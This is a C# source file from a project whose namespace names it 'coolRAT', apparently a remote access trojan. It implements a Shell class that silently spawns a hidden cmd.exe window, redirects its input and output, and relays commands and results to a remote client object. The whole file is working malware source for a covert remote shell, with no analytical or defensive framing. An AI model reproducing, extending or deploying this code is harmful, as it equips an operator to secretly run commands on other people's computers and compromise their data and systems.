using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace coolRAT.Libs
{
    public class ShellInputChangedEventArgs : EventArgs
    {
        public string Change;

        public ShellInputChangedEventArgs(string change)
        {
            Change = change;
        }
    }

    public class ShellOutputChangedEventArgs : EventArgs
    {
        public string Change;

        public ShellOutputChangedEventArgs(string change)
        {
            Change = change;
        }
    }

    public class Shell
    {
        public Guid UniqueId;
        public Process Process;
        public Client OwnerClient;

        public StringBuilder GlobalOutputBuffer;
        public StringBuilder GlobalInputBuffer;

        private DataReceivedEventHandler DataReceivedEventHandler;

        public delegate void ShellInputChangedHandler(object sender, ShellInputChangedEventArgs e);
        public event ShellInputChangedHandler ShellInputChanged;

        public delegate void ShellOutputChangedHandler(object sender, ShellOutputChangedEventArgs e);
        public event ShellOutputChangedHandler ShellOutputChanged;

        public static bool ResetClock;
        public static int Buffer_Timeout = 100;

        public Shell(Guid uniqueId, Client ownerClient)
        {
            UniqueId = uniqueId;
            OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
            Initialize_Shell();
        }

        public Shell(Client ownerClient)
        {
            UniqueId = Guid.NewGuid();
            OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
            Initialize_Shell();
        }

        public void Clock_Tick()
        {
            while (true)
            {
                Thread.Sleep(Buffer_Timeout);
                if (!ResetClock)
                {
                    if (GlobalOutputBuffer.Length == 0) continue;
                    // Send buffer contents to the remote shell
                    if (ShellOutputChanged != null)
                    {
                        ShellOutputChangedEventArgs args = new ShellOutputChangedEventArgs(GlobalOutputBuffer.ToString());
                        ShellOutputChanged(this, args);
                    }
                    GlobalOutputBuffer.Clear();
                }
                else
                    ResetClock = false;
            }
        }

        private protected void Initialize_Shell()
        {
            GlobalOutputBuffer = new StringBuilder();
            GlobalInputBuffer = new StringBuilder();
            Process = new Process();
            Process.StartInfo.FileName = "cmd.exe";
            Process.StartInfo.CreateNoWindow = true;
            Process.StartInfo.UseShellExecute = false;
            Process.StartInfo.RedirectStandardOutput = true;
            Process.StartInfo.RedirectStandardError = true;
            Process.StartInfo.RedirectStandardInput = true;
            DataReceivedEventHandler = new DataReceivedEventHandler(CmdOutputDataHandler);
            Process.OutputDataReceived += DataReceivedEventHandler;
            Process.ErrorDataReceived += DataReceivedEventHandler;
        }

        public void Start()
        {
            Process.Start();
            Task.Run(() => Clock_Tick());
            Process.BeginOutputReadLine();
            Process.BeginErrorReadLine();
        }

        public void Stop()
        {
            Process.Kill();
            Process.OutputDataReceived -= DataReceivedEventHandler;
            Process.ErrorDataReceived -= DataReceivedEventHandler;
        }

        public void Write(string str)
        {
            Process_Input(str);
            ResetClock = true;
        }

        public void WriteLine(string str)
        {
            Process_Input(str);
            ResetClock = true;
        }

        public void Process_Input(string input)
        {
            char[] in_arr = input.ToCharArray();
            foreach (char chr in in_arr)
            {
                switch (chr)
                {
                    case '\n': // Flush the buffer and write to the input stream
                        GlobalInputBuffer.Append(chr);
                        GlobalOutputBuffer.Append(chr);
                        Process.StandardInput.Write(GlobalInputBuffer.ToString());
                        GlobalInputBuffer.Clear();
                        break;
                    case '\b':
                        if (GlobalInputBuffer.Length == 0) continue;
                        GlobalInputBuffer.Remove(GlobalInputBuffer.Length - 1, 1);
                        GlobalOutputBuffer.Append(chr);
                        break;
                    default: // Add the character to the buffer
                        GlobalInputBuffer.Append(chr);
                        GlobalOutputBuffer.Append(chr);
                        break;
                }
            }

        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                GlobalOutputBuffer.AppendLine(outLine.Data);
                strOutput.AppendLine(outLine.Data);
                ResetClock = true;
            }
        }
    }
}
